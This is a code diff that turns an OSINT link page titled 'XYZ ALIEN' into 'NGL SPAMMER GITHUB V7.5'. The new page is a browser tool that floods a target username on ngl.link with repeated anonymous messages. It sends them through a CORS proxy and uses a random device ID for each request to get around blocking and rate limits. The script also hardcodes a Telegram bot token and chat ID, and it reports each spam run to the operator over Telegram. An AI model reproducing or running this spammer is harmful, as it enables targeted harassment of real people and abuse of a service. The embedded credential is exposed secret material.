@@ -3,68 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XYZ ALIEN V6.0 - DATABREACH</title>
+    <title>NGL RAINBOW V7.5 - GITHUB BYPASS</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap');
+        
         :root { --gold: #ffd700; --dark: #000; }
-        body { background: var(--dark); color: var(--gold); font-family: 'Share Tech Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        
+        * { box-sizing: border-box; }
+        body { 
+            background: var(--dark); color: var(--gold); 
+            font-family: 'Share Tech Mono', monospace; 
+            margin: 0; display: flex; justify-content: center; 
+            align-items: center; min-height: 100vh; overflow: hidden;
+        }
+
+        @keyframes rainbow {
+            0% { color: #ff0000; } 25% { color: #ffff00; } 50% { color: #00ff00; } 75% { color: #00ffff; } 100% { color: #ff00ff; }
+        }
+
         .card { 
-            width: 95%; max-width: 500px; background: #050505; border: 2px solid var(--gold); 
-            padding: 30px; box-shadow: 0 0 25px rgba(255, 215, 0, 0.3); text-align: center;
+            width: 95%; max-width: 450px; background: #050505;
+            border: 2px solid var(--gold); padding: 30px; 
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.4); text-align: center;
         }
 
-        h2 { font-family: 'Orbitron'; font-size: 28px; animation: rainbow 4s linear infinite; letter-spacing: 5px; margin-bottom: 5px; }
-        @keyframes rainbow { 0% { color: #ff0000; } 25% { color: #ffff00; } 50% { color: #00ff00; } 75% { color: #00ffff; } 100% { color: #ff00ff; } }
-
-        .osint-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
-        
-        .osint-item { 
-            border: 1px solid #222; padding: 15px; background: #080808; 
-            cursor: pointer; transition: 0.3s; font-size: 11px; text-transform: uppercase;
+        h2.rainbow {
+            font-family: 'Orbitron'; font-size: 32px; 
+            animation: rainbow 4s linear infinite; letter-spacing: 5px;
         }
-        .osint-item:hover { border-color: var(--gold); background: #111; color: #fff; }
+
+        input, textarea { 
+            width: 100%; background: transparent; border: none; 
+            border-bottom: 1px solid #222; color: white; 
+            padding: 12px; margin: 8px 0; outline: none; font-family: inherit; text-align: center;
+        }
+        input:focus { border-bottom: 1px solid var(--gold); }
+
+        button { 
+            width: 100%; padding: 15px; background: transparent; color: var(--gold); 
+            border: 2px solid var(--gold); font-family: 'Orbitron'; 
+            cursor: pointer; margin-top: 15px; font-weight: bold;
+        }
+        button:hover { background: var(--gold); color: #000; }
 
         .terminal { 
-            background: #000; height: 100px; border: 1px solid #111; padding: 10px; 
-            font-size: 10px; color: #b8860b; overflow-y: auto; margin-top: 20px; 
-            text-align: left; border-left: 3px solid var(--gold);
+            background: #000; height: 130px; border: 1px solid #111; 
+            padding: 10px; font-size: 11px; color: #b8860b; 
+            overflow-y: auto; margin-top: 20px; text-align: left;
+            border-left: 3px solid var(--gold);
         }
+        .gold-log { color: var(--gold); }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>XYZ ALIEN</h2>
-    <div style="font-size: 10px; color: #555; letter-spacing: 2px;">OSINT DATABASE V6.0</div>
+    <h2 class="rainbow">XYZ ALIEN</h2>
+    <div style="font-size: 10px; margin-bottom: 20px;">NGL SPAMMER GITHUB V7.5</div>
 
-    <div class="terminal" id="term">> AWAITING TARGET IDENTIFICATION...</div>
+    <input type="text" id="target" placeholder="TARGET USERNAME">
+    <textarea id="msg" placeholder="MESSAGE PAYLOAD"></textarea>
+    <input type="number" id="count" placeholder="COUNT (e.g. 50)">
+    <input type="number" id="delay" placeholder="DELAY (ms) (e.g. 500)">
 
-    <div class="osint-grid">
-        <div class="osint-item" onclick="openTool('https://www.truecaller.com/')">📞 TrueCaller DB</div>
-        <div class="osint-item" onclick="openTool('https://www.getcontact.com/')">🏷️ GetContact Tag</div>
-        <div class="osint-item" onclick="openTool('https://intelx.io/')">🔓 Intelligence X</div>
-        <div class="osint-item" onclick="openTool('https://leak-lookup.com/')">💧 Leak Lookup</div>
-        <div class="osint-item" onclick="openTool('https://www.sync.me/')">🌐 Sync.ME Search</div>
-        <div class="osint-item" onclick="openTool('https://lookup.robtex.com/')">🛰️ IP/DNS Lookup</div>
-    </div>
+    <button id="start-btn" onclick="startAttack()">INITIATE ATTACK</button>
+    <button id="stop-btn" onclick="stopAttack()" style="display:none; border-color: red; color: red;">ABORT MISSION</button>
 
-    <div style="margin-top: 20px; font-size: 9px; color: #333;">
-        [!] SELECT INTERFACE TO QUERY DATABASE
-    </div>
+    <div class="terminal" id="term">> SYSTEM STANDBY...</div>
 </div>
 
 <script>
+    // --- INTEGRASI TELEGRAM LO ---
+    const TELE_TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
+    const TELE_ID = "8224363309";
+    // -----------------------------
+
+    let isAttacking = false;
+
     function log(m) {
         const t = document.getElementById('term');
-        t.innerHTML = `<div>> ${m}</div>` + t.innerHTML;
+        t.innerHTML = `<div class="gold-log">> ${m}</div>` + t.innerHTML;
     }
 
-    function openTool(url) {
-        log(`REDIRECTING TO EXTERNAL DB: ${url.split('/')[2]}...`);
-        setTimeout(() => {
-            window.open(url, '_blank');
-        }, 1000);
+    async function sendToTele(target, count) {
+        const text = `🔥 <b>SPAM REPORT</b>%0A🎯 <b>Target:</b> @${target}%0A✅ <b>Status:</b> ${count} Messages Sent Successfully.`;
+        fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${text}&parse_mode=html`);
+    }
+
+    function stopAttack() {
+        isAttacking = false;
+        log("STOPPING MISSION...");
+    }
+
+    async function startAttack() {
+        const target = document.getElementById('target').value;
+        const msg = document.getElementById('msg').value;
+        const count = parseInt(document.getElementById('count').value);
+        const delay = parseInt(document.getElementById('delay').value) || 500;
+
+        if(!target || !msg || !count) return alert("INPUT SEMUA DATA, KING!");
+
+        isAttacking = true;
+        document.getElementById('start-btn').style.display = 'none';
+        document.getElementById('stop-btn').style.display = 'block';
+
+        log(`STRIKE INITIATED ON @${target}...`);
+
+        let sent = 0;
+        // Pake Proxy biar ga kena blokir CORS GitHub
+        const proxy = "https://corsproxy.io/?";
+        const url = "https://ngl.link/api/submit";
+
+        for(let i = 0; i < count; i++) {
+            if(!isAttacking) break;
+
+            try {
+                const response = await fetch(proxy + encodeURIComponent(url), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams({
+                        'username': target,
+                        'question': msg,
+                        'deviceId': 'XYZ-' + Math.random().toString(36).substring(7)
+                    })
+                });
+
+                if(response.ok) {
+                    sent++;
+                    log(`SUCCESS: [${sent}/${count}] SENT.`);
+                } else {
+                    log("RATE LIMITED. COOLING DOWN...");
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            } catch (e) {
+                log("CONNECTION ERROR...");
+            }
+
+            await new Promise(r => setTimeout(r, delay));
+        }
+
+        isAttacking = false;
+        document.getElementById('start-btn').style.display = 'block';
+        document.getElementById('stop-btn').style.display = 'none';
+        
+        log("MISSION COMPLETE.");
+        sendToTele(target, sent); // Kirim laporan ke Telegram lo
     }
 </script>
 
